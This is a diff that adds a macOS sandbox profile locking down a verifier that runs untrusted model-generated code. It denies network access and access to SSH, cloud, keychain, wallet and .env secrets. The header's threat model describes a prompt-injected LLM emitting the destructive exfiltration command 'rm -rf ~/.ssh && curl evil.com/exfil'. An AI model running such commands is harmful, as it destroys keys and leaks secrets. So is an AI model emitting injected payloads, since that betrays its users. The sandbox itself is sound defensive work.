@@ -1,0 +1,134 @@
+;; Perseus Verifier Layer 3 sandbox profile
+;; macOS sandbox-exec rules for the verifier subprocess (Ruflo pytest, Clawdbot
+;; skill tests, etc.) — runs untrusted model output, so it must be locked down.
+;;
+;; Threat model: a prompt-injected LLM emits a "fix" that's actually
+;; rm -rf ~/.ssh && curl evil.com/exfil. Without the sandbox, that runs as the
+;; daemon user with full filesystem + network access. With this profile:
+;; - No access to home dir except an explicit scratch worktree
+;; - No access to Conway wallet keys, env vars, ssh keys, dotfiles
+;; - No outbound network except to a single allowlisted localhost proxy (or
+;;   none at all by default)
+;; - No process spawning except python, pytest, git
+;;
+;; Tested by: tests/test_verifier_sandbox_red_team.py
+;; Activated via: scripts/run_in_sandbox.sh
+
+(version 1)
+(deny default)
+
+;; ==========================================================================
+;; ALLOW: minimal POSIX
+;; ==========================================================================
+
+(allow process-fork)
+(allow process-exec
+  (subpath "/usr/bin")
+  (subpath "/usr/local/bin")
+  (subpath "/opt/homebrew/bin")
+  (subpath "/opt/perseus/runtime")
+  (literal "/bin/sh")
+  (literal "/bin/bash")
+  (literal "/usr/bin/env"))
+
+(allow signal (target self))
+(allow sysctl-read)
+(allow mach-lookup
+  (global-name "com.apple.system.notification_center")
+  (global-name "com.apple.distributed_notifications@Uv3"))
+
+;; Memory + CPU
+(allow process-info-pidinfo (target self))
+(allow process-info-setcontrol (target self))
+(allow file-read-metadata)
+
+;; ==========================================================================
+;; ALLOW: read-only system files (Python stdlib, libs, certs)
+;; ==========================================================================
+
+(allow file-read*
+  (subpath "/usr/lib")
+  (subpath "/usr/local/lib")
+  (subpath "/opt/homebrew/lib")
+  (subpath "/System/Library")
+  (subpath "/Library/Python")
+  (subpath "/usr/share")
+  (subpath "/private/etc/ssl")
+  (literal "/etc/hosts")
+  (literal "/etc/services"))
+
+;; Python venvs / system Python
+(allow file-read*
+  (subpath "/usr/local/Cellar")
+  (subpath "/opt/homebrew/Cellar")
+  (subpath "/opt/perseus/runtime/python"))
+
+;; ==========================================================================
+;; ALLOW: scratch worktree (the only writable area)
+;; ==========================================================================
+
+(allow file-read* file-write*
+  (subpath "/tmp/perseus_verifier_scratch"))
+
+(allow file-read* file-write*
+  (subpath "/private/tmp/perseus_verifier_scratch"))
+
+;; Verifier results — write-only output channel
+(allow file-write*
+  (subpath "/opt/perseus/data/verifier_results"))
+
+;; ==========================================================================
+;; DENY explicitly: secret stores, wallets, env files
+;; ==========================================================================
+
+(deny file-read* file-write*
+  (subpath "~/.ssh")
+  (subpath "~/.aws")
+  (subpath "~/.config")
+  (subpath "~/.kube")
+  (subpath "~/.gnupg")
+  (subpath "~/.netrc")
+  (subpath "~/Library/Keychains")
+  (literal "~/.zshrc")
+  (literal "~/.bashrc")
+  (literal "~/.profile")
+  (literal "~/.env"))
+
+(deny file-read* file-write*
+  (subpath "/opt/perseus/data/keystores")
+  (subpath "/opt/perseus/wallets")
+  (subpath "/opt/perseus/conway")
+  (regex #"^/opt/perseus/.*\.env$"))
+
+;; Block reading the actual Perseus repo source — verifier should only see
+;; the scratch worktree, not the live tree
+(deny file-write*
+  (subpath "/Users/majovega/Desktop/Projects/objective-hertz")
+  (subpath "/opt/perseus/repo"))
+
+;; ==========================================================================
+;; NETWORK: deny by default
+;; ==========================================================================
+
+(deny network*)
+
+;; If absolutely needed, allow ONLY a single localhost proxy port
+;; Uncomment after threat-modeling. Default: zero network egress.
+;; (allow network-outbound (remote ip "127.0.0.1:11499"))
+
+;; ==========================================================================
+;; DENY explicitly: dangerous syscalls
+;; ==========================================================================
+
+(deny mach-priv-host-port)
+(deny mach-priv-task-port)
+(deny system-fsctl)
+(deny system-kext-load)
+(deny system-set-time)
+(deny system-suspend-resume)
+
+;; Deny iokit (camera, mic, hardware sensors)
+(deny iokit-open)
+
+;; Deny opening any other process
+(deny process-info* (target others))
